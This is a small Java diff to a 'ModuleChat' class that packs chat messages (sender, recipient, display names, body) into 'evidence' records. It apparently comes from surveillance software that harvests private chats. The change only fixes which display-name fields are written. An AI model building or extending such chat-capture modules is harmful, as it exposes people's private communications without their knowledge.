@@ -136,11 +136,11 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			// FROM
 			items.add(WChar.getBytes(message.from, true));
 			// FROM DISPLAY
-			items.add(WChar.getBytes(message.from, true));
+			items.add(WChar.getBytes(message.displayFrom, true));
 			// TO
 			items.add(WChar.getBytes(message.to, true));
 			// TO DISPLAY
-			items.add(WChar.getBytes(message.to, true));
+			items.add(WChar.getBytes(message.displayTo, true));
 			// CONTENT
 			items.add(WChar.getBytes(message.body, true));
 			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
